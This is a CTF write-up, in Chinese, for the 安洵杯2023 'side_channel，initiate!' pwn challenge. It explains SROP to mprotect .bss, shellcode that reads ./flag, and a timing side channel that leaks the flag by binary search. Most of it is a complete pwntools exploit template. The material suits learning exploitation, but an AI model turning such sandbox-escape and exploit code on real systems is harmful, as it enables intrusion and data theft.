当程序有办法读取到flag但无法将flag输出出来时，可以采用侧信道爆破flag确定其内容。

例题：[安洵杯2023 side_channel，initiate!](https://files.cnblogs.com/files/blogs/709433/side_channel%EF%BC%8Cinitiate.7z?t=1711625090&download=true "安洵杯2023 side_channel，initiate!")

题目本身很简单，允许在bss上写一大段，然后一个栈溢出。但沙箱是这个画风：
![image](https://img2024.cnblogs.com/blog/2567452/202403/2567452-20240328194202670-441879943.png)
函数里还有一个单纯的`mov rax 0fh`，允许了rt_stgreturn和mprotect的权限，很明显的提示，就是让我们SROP之后利用mprotect改bss的执行权限，然后在bss上执行shellcode。
具体就是在bss上布置好SROP所需的ROP链，sigframe，预留好后面执行shellcode所需的栈，"./flag"以及shellcode，后面的读入再开始栈迁移。执行的时候先从栈段迁移到bss上，做`mov rax 0fh`之类的设置sigframe，sigframe设置成跳到mprotect，把bss的执行权限改出来，然后rsp设置到之前预留好的bss上的"栈"上。rip做完syscall紧接着一个ret就可以返回到shellcode上，继续往高地址执行；rsp往低地址增长即可。
```
        buf = 0x404060
        bss_H = 0x405000
        rax_15_ret = 0x401193
        leave_ret = 0x401446
        syscall_rbp_ret = 0x40118a
        call_syscall = 0x401186
        payload = b""
        payload = payload.ljust(0x400,b'\0')
        sigframe = SigreturnFrame()
        sigframe.rax = 10
        sigframe.rdi = 0x404000
        sigframe.rsi = 0x2000
        sigframe.rdx = 7
        sigframe.rsp = buf+0x508
        sigframe.rbp = buf+0x508
        sigframe.rip = call_syscall
        payload+= p64(rax_15_ret) + p64(syscall_rbp_ret) + bytes(sigframe)
        payload = payload.ljust(0x500,b'\0')
        payload+= p64(buf+0x518) + b"./flag\0\0"
        payload +=asm(sh.format(index,mid))
        # p = process("./chall")
        p = remote("47.108.206.43",25678)
        p.recvline()
        p.send(payload)
        payload = b'a'*0x2a + p64(buf+0x400-8) + p64(leave_ret)
        T = time.time()
        # gdb.attach(p)
        p.recvline()
        p.send(payload)
```

然后开始执行shellcode，做我们的侧信道。在shellcode中把flag读到内存中，然后用这样的汇编代码来猜测字符：
```
mov rax,0
mov rdi,3
mov rsi,0x404600
mov rdx,0x40
syscall
mov rax,rsi
mov bl,byte ptr [rax+{}]
cmp bl,{}
ja $-3
```
即，拿读到的第i个字符和猜测字符j比对，若flag[i]>j则进入循环卡死，若不同则执行到shellcode结尾爆sigsegv，如是二分查找flag的每个字符。由于远程交互还需要时间加上py效率可疑，而且判断timeout的时间必须要给充足，逐个匹配循环查找太慢了基本没法用，二分查找十几秒就能跑出一个字符来，速度可以接受。当时打远程看见flag一个一个出来了还是挺激动的（
记一下完整代码，作为侧信道板子：
```
from pwn import*
context.arch = 'amd64'
s = "{}=-abcdefghijklmnopqrstuvwxyz0123456789"
list = [ord(x) for x in s]
sh = """
mov rax,2
mov rdi,0x404570
mov rsi,0
mov rdx,0
syscall
mov rax,0
mov rdi,3
mov rsi,0x404600
mov rdx,0x40
syscall
mov rax,rsi
mov bl,byte ptr [rax+{}]
cmp bl,{}
ja $-3
"""
#若猜测的字符小于真实字符则会被卡死
index = 0
flag=""
while(1):
    l=32
    r=126
    ans=0
    while(l<=r):
        mid = (l+r)>>1
        buf = 0x404060
        bss_H = 0x405000
        rax_15_ret = 0x401193
        leave_ret = 0x401446
        syscall_rbp_ret = 0x40118a
        call_syscall = 0x401186
        payload = b""
        payload = payload.ljust(0x400,b'\0')
        sigframe = SigreturnFrame()
        sigframe.rax = 10
        sigframe.rdi = 0x404000
        sigframe.rsi = 0x2000
        sigframe.rdx = 7
        sigframe.rsp = buf+0x508
        sigframe.rbp = buf+0x508
        sigframe.rip = call_syscall
        payload+= p64(rax_15_ret) + p64(syscall_rbp_ret) + bytes(sigframe)
        payload = payload.ljust(0x500,b'\0')
        payload+= p64(buf+0x518) + b"./flag\0\0"
        payload +=asm(sh.format(index,mid))
        # p = process("./chall")
        p = remote("47.108.206.43",25678)
        p.recvline()
        p.send(payload)
        payload = b'a'*0x2a + p64(buf+0x400-8) + p64(leave_ret)
        T = time.time()
        # gdb.attach(p)
        p.recvline()
        p.send(payload)
        try:
            cur = p.recv(timeout=1)
            print(str(time.time()-T))
            if(time.time()-T>0.9):
                print("Too Small Too Small Too Small Too Small Too Small Too Small ")
                l=mid+1
            else:
                print("Big or Equal Big or Equal Big or Equal Big or Equal ")
                ans=mid
                r=mid-1
        except:
            print(str(time.time()-T))
            print("Big or Equal Big or Equal Big or Equal Big or Equal ")
            ans=mid
            r=mid-1
        p.close()
    flag+= chr(ans)
    print("Now Ans Now Ans Now Ans Now Ans Now Ans Now Ans Now Ans Now Ans " + flag)
    index = index+1
    if '}' in flag:
        break

print(flag)
```
